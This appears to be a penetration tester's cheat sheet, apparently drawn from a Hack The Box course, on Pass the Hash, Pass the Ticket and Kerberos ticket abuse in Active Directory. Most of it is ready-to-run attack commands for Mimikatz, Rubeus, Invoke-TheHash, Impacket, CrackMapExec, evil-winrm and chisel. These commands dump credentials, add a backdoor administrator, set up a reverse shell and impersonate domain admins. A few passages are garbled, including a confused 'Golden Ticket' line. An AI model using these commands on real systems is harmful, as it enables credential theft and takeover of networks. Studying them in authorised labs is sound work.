### Pass the Hash (PtH)

[Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/)

```
# A PtH attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.
# The attacker doesn't need to decrypt the hash to obtain a plaintext password. 
# PtH attacks exploit the authentication protocol, 
# as the password hash remains static for every session until the password is changed.

# Attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash.
# Hashes can be obtained in several ways, including:

- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).
```

### Windows NTLM Introduction

[Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview)

```
# NTLM is a set of security protocols that authenticates users' identities 
# while also protecting the integrity and confidentiality of their data. 
# NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol 
# to verify the user's identity without having them provide a password.

# While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism 
# in Windows 2000 and subsequent Active Directory (AD) domains.

# With NTLM, passwords stored on the server and domain controller are not "salted," 
# which means that an adversary with a password hash can authenticate a session without knowing the original password. 
# We call this a Pass the Hash (PtH) Attack.
```

### Pass the Hash with Mimikatz (Windows)

[Mimikatz](https://github.com/gentilkiwi)

```
# Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack 
# by starting a process using the hash of the user's password. 
# To use this module, we will need the following:

/user         - The user name we want to impersonate.
/rc4 or /NTLM - NTLM hash of the user's password.
/domain       - Domain the user to impersonate belongs to. 
                In the case of a local user account, we can use the computer name, localhost, or a dot (.).
/run          - The program we want to run with the user's context (if not specified, it will launch cmd.exe).
```

```
# Pass the Hash from Windows Using Mimikatz
# with known username and hash value:

c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

type \\dc01\\julio\julio.txt           # connecting to Domain Controller host (DC01) shared folder
```

### Pass the Hash with PowerShell Invoke-TheHash (Windows)

[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

```
# This tool above is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. 
# Local administrator privileges are not required client-side, 
# but the user and hash we use to authenticate need to have administrative rights on the target computer.

# To use this tool, we need to specify the following parameters to execute commands in the target computer:

Target      - Hostname or IP address of the target.
Username    - Username to use for authentication.
Domain      - Domain to use for authentication.This parameter is unnecessary with local accounts or @domain after the username.
Hash        - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
Command     - Command to execute on the target. If a command is not specified, the function will check user WMI access. 

# Command below will use the SMB method for command execution to create a new user named mark 
# and add the user to the Administrators group.:

cd C:\tools\Invoke-TheHash\
c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

[Reverse Shell Generator](https://www.revshells.com/)

```
# Netcat Listener 
# We can also get a reverse shell connection in the target machine.:
C:\tools> .\nc.exe -lvnp 8001         # on cmd
listening on [any] 8001 ...

# To create a simple reverse shell using PowerShell, 
# we can visit https://www.revshells.com/, set our IP 172.16.1.5 and port 8001, 
# and select the option PowerShell #3 (Base64)


# Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. 
# Notice that instead of providing the IP address, which is 172.16.1.10, 
# we will use the machine name DC01 (either would work).
# (in second session of PS terminal, keep first with listening nc.exe)

### Pass the Hash with Impacket (Linux) 

[Impacket](https://github.com/SecureAuthCorp/impacket)

```
# Impacket has several tools we can use for different operations such as Command Execution 
# and Credential Dumping, Enumeration, etc. 
# For this example, we will perform command execution on the target machine using PsExec.:

impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453   # Run with admin user and known hash

```
# There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, 
# such as:
```

### Pass the Hash with CrackMapExec (Linux)

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

```
# CrackMapExec is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. 
# We can use CrackMapExec to try to authenticate to some or all hosts in a network 
# looking for one host where we can authenticate successfully as a local admin. 
# This method is also called "Password Spraying":

crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453    # Run with admin and known hash

# Note that this method can lock out domain accounts, so keep the target domain's account lockout policy in mind.

# If we want to perform the same actions but attempt to authenticate to each host in a subnet 
# using the local administrator password hash, we could add --local-auth to our command.

# If we see Pwn3d!, it means that the user is a local administrator on the target computer. 
# We can use the option -x to execute commands. 
# It is common to see password reuse against many hosts in the same subnet. 
# Organizations will often use gold images with the same local admin password 
# or set this password the same across multiple hosts for ease of administration. 

# To fix admin passwords reuse it's a good idea look into "Local Administrator Password Solution (LAPS)"
```

```
# CrackMapExec - Command Execution

crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### Pass the Hash with evil-winrm (Linux)

[evil-winrm](https://github.com/Hackplayers/evil-winrm)

```
# Another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. 
# If SMB is blocked or we don't have administrative rights, 
# we can use this alternative protocol to connect to the target machine.

evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

# Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb
```

### Pass the Hash with RDP (Linux)

```
# We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp
# There are a few caveats to this attack:

- Restricted Admin Mode, which is disabled by default, should be enabled on the target host;

# This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) 
# under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0.:

c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:

xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

### UAC Limits Pass the Hash for Local Accounts

```
# UAC (User Account Control) limits local users' ability to perform remote administration operations. 
# When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is 0, 
# it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed 
# to perform remote administration tasks. 
# Setting it to 1 allows the other local admins as well.

# Note: 
# There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), 
# the RID 500 account (even if it is renamed) is enrolled in UAC protection. 
# This means that remote PTH will fail against the machine when using that account.

# These settings are only for local administrative accounts. 
# If we get access to a domain account with administrative rights on a computer, 
# we can still use Pass the Hash with that computer.

### Pass the Ticket (PtT) from Windows

[Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/)

```
# Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. 
# In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.
```

### Kerberos Protocol Refresher

```
# The Kerberos authentication system is ticket-based. 
# The central idea behind Kerberos is not to give an account password to every service you use. 
# Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service,
# preventing a ticket from being used for another purpose.

The TGT -
# Ticket Granting Ticket is the first ticket obtained on a Kerberos system. 
# The TGT permits the client to obtain additional Kerberos tickets or TGS.

The TGS - 
# Ticket Granting Service is requested by users who want to use a service. 
# These tickets allow services to verify the user's identity.
```

### Pass the Ticket (PtT) Attack

```
# We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). 
# It can be:

# Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
# Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
# Also Kerberos hav third Golden Ticket which is using to encryot TGT. (And it's a third had of a dog)
```

### Harvesting Kerberos Tickets from Windows

```
# Mimikatz - Export Tickets

mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit
dir *.kirbi

# The tickets that end with $ correspond to the computer account, 
# which needs a ticket to interact with the Active Directory. 
# User tickets have the user's name, followed by an @ that separates the service name and the domain.
```

```
# Rubeus - Export Tickets

Rubeus.exe dump /nowrap

# Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.
```

### Pass the Key or OverPass the Hash

[Abusing Microsoft Kerberos - Sorry you guys don't get it](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18)
[Rubeus](https://github.com/GhostPack/Rubeus)

```
# The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos.
# The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) 
# for a domain-joined user into a full Ticket-Granting-Ticket (TGT). 

# To forge our tickets, we need to have the user's hash; 
# we can use Mimikatz to dump all users Kerberos encryption keys using the module 
# sekurlsa::ekeys.

mimikatz.exe
privilege::debug
sekurlsa::ekeys

# Now that we have access to the AES256_HMAC and RC4_HMAC keys, 
# we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.

mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

# This will create a new cmd.exe window that we can use to request access 
# to any service we want in the context of the target user.
# To forge a ticket using Rubeus, we can use the module asktgt with the 
# username, domain, and hash which can be /rc4, /aes128, /aes256, or /des.
```

```
# Rubeus - Pass the Key or OverPass the Hash

Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

# Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
```

### Pass the Ticket (PtT)

```
# Now that we have some Kerberos tickets, we can use them to move laterally within an environment.
# With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. 
# Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.

Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

# Note that now it displays Ticket successfully imported!.
# Another way is to import the ticket into the current session using the .kirbi file from the disk.
# Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.

Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack.
# We can use PowerShell to convert a .kirbi to base64.

### Pass the Ticket (PtT) from Linux

```
# Although not common, Linux computers can connect to Active Directory 
# to provide centralized identity management and integrate with the organization's systems, 
# giving users the ability to have a single identity to authenticate on Linux and Windows computers.

# A Linux computer connected to Active Directory commonly uses Kerberos as authentication. 
# Suppose this is the case, and we manage to compromise a Linux machine connected to Active Directory. 
# In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.

# Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). 
# However, how they store the ticket information may vary depending on the Linux distribution and implementation.
# In most cases, Linux machines store Kerberos tickets as ccache files in the /tmp directory. 
# By default, the location of the Kerberos ticket is stored in the environment variable KRB5CCNAME.
```

### Linux Auth via Port Forward

```
# We created a port forward to simplify the interaction with LINUX01. 
# By connecting to port TCP/2222 on MS01, we will gain access to port TCP/22 on LINUX01.
# Let's assume we are in a new asmt, and the company gives us access to LINUX01 
# and the user david@inlanefreight.htb and password Password2.

ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

### Identifying Linux and Active Directory Integration

[realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd)
[sssd](https://sssd.io/)
[winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html)
[kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html)

```
realm list                                    # realm - Check If Linux Machine is Domain Joined
ps -ef | grep -i "winbind\|sssd"              # check other AD tools if realm is not avail on target host
```

### Finding Kerberos Tickets in Linux

```
find / -name *keytab* -ls 2>/dev/null         # Finding Keytab Files
crontab -l                                    # Identifying Keytab Files in Cronjobs (kinit)
```

### Finding ccache Files

```
env | grep -i krb5                            # Reviewing Environment Variables for ccache Files.

# As mentioned previously, ccache files are located, by default, at /tmp. 
# We can search for users who are logged on to the computer, 
# and if we gain access as root or a privileged user, 
# we would be able to impersonate a user using their ccache file while it is still valid.

ls -la /tmp                                   # Check for krb5cc files
```

### Abusing KeyTab Files

```
# The first thing we can do is impersonate a user using kinit. 
# To use a keytab file, we need to know which user it was created for. 
# klist is another application used to interact with Kerberos on Linux. 
# This application reads information from a keytab file. 

klist -k -t                                     # Listing keytab File Information
klist                                           # Impersonating a User with a keytab
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist

# We can attempt to access the shared folder \\dc01\carlos to confirm our access.

smbclient //dc01/carlos -k -c ls                # Connecting to SMB Share as Carlos

# Note: To keep the ticket from the current session, before importing the keytab, 
# save a copy of the ccache file present in the environment variable KRB5CCNAME.
```

### Keytab Extract

[crackstation.net](https://crackstation.net/)

```
# The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. 
# We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, 
# but if we want to gain access to his account on the Linux machine, we'll need his password.

# We can attempt to crack the account's password by extracting the hashes from the keytab file. 
# KeyTabExtract, a tool to extract valuable information from 502-type .keytab files, 
# which may be used to authenticate Linux boxes to Kerberos.

python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab     # Extracting Keytab Hashes with KeyTabExtract

# With the NTLM hash, we can perform a Pass the Hash attack. 
# With the AES256 or AES128 hash, 
# we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

# Note: A keytab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.

# The most straightforward hash to crack is the NTLM hash. 
# We can use tools like Hashcat or John the Ripper to crack it. 
# However, a quick way to decrypt passwords is with online repositories such as https://crackstation.net/, 
# which contains billions of passwords.

# Example from crack station:
a738f92b3c08b424ec2d99589a9cce60 NTLM Password5 

su - carlos@inlanefreight.htb                # We can now log in as Carlos.
carlos@inlanefreight.htb@linux01:~$ klist 

# Carlos has a cronjob that uses a keytab file named svc_workstations.kt. 
# We can repeat the process, crack the password, and log in as svc_workstations.
```

### Abusing Keytab ccache

```
# To abuse a ccache file, all we need is read privileges on the file. 
# These files, located in /tmp, can only be read by the user who created them, 
# but if we gain root access, we could use them.

# Once we log in with the credentials for the user svc_workstations, 
# we can use sudo -l and confirm that the user can execute any command as root. 
# We can use the sudo su command to change the user to root.

# Privilege Escalation to Root:

ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
sudo -l
sudo su
whoami
# root

# As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.

ls -la /tmp                                  # Looking for ccache Files

# There is one user (julio@inlanefreight.htb) to whom we have not yet gained access. 
# We can confirm the groups to which he belongs using id.

id julio@inlanefreight.htb

# Julio is a member of the Domain Admins group. 
# We can attempt to impersonate the user and gain access to the DC01 Domain Controller host.
# To use a ccache file, we can copy the ccache file and assign the file path to the KRB5CCNAME variable.

klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
smbclient //dc01/C$ -k -c ls -no-pass
```

### Using Linux Attack Tools with Kerberos

[Chisel](https://github.com/jpillora/chisel)
[Proxychains](https://github.com/haad/proxychains)

``` 
# Most Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. 
# If we use them from a domain-joined machine, 
# we need to ensure our KRB5CCNAME environment variable is set to the ccache file we want to use.


cat /etc/hosts                       # check current hostnames status
     
cat /etc/proxychains.conf            # Proxychains Configuration File (sockks5 must be configured)
output:
...
[ProxyList]
socks5 127.0.0.1 1080

# Download and execute chisel

wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 

xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution     # Connect to MS01 with xfreerdp

c:\tools\chisel.exe client 10.10.14.33:8080 R:socks                                          # Execute chisel from MS01

# Note: The client IP is your attack host IP.

# Finally, we need to transfer Julio's ccache file from LINUX01 
# and create the environment variable KRB5CCNAME with the value corresponding to the path of the ccache file.

export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133       # Setting the KRB5CCNAME Environment Variable
proxychains impacket-wmiexec dc01 -k                              # Using Impacket with proxychains and Kerberos Authentication
output:
C:\>whoami
inlanefreight\julio

# Note: 
# If you are using Impacket tools from a Linux machine connected to the domain, 
# note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. 
# If this is the case, we need to modify the variable only to include the path to the ccache file.
```

### Evil-Winrm

[Evil-Winrm](https://github.com/Hackplayers/evil-winrm)

```
# To use evil-winrm with Kerberos, we need to install the Kerberos package used for network authentication. 
# For some Linux like Debian-based (Parrot, Kali, etc.), it is called krb5-user. 
# While installing, we'll get a prompt for the Kerberos realm. 
# Use the domain name: INLANEFREIGHT.HTB, and the KDC is the DC01.

sudo apt-get install krb5-user -y                       # Installing Kerberos Authentication Package

# In case the package krb5-user is already installed, 
# we need to change the configuration file /etc/krb5.conf to include the following values:

cat /etc/krb5.conf                                      # Kerberos Configuration File for INLANEFREIGHT.HTB
output:
[libdefaults]
        default_realm = INLANEFREIGHT.HTB
...
[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

...

proxychains evil-winrm -i dc01 -r inlanefreight.htb     # Using Evil-WinRM with Kerberos
```


### Miscellaneous

[impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py)

```
# If we want to use a ccache file in Windows or a kirbi file in a Linux machine, 
# we can use impacket-ticketConverter to convert them. 
# To use it, we specify the file we want to convert and the output filename. 
# Let's convert Julio's ccache file to kirbi.

impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi     # Impacket Ticket Converter

# We can do the reverse operation by first selecting a .kirbi file. 
# Let's use the .kirbi file in Windows.:

C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
dir \\dc01\julio
type \\dc01\julio\julio.txt
```

### Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz)

```
# Linikatz is a tool created by Cisco's security team for exploiting credentials on Linux machines 
# when there is an integration with Active Directory. 
# In other words, Linikatz brings a similar principle to Mimikatz to UNIX environments.

# Just like Mimikatz, to take advantage of Linikatz, we need to be root on the machine. 
# This tool will extract all credentials, including Kerberos tickets, 
# from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. 
# Once it extracts the credentials, it places them in a folder whose name starts with linikatz...

# Linikatz Download and Execution:

wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
./linikatz.sh
```
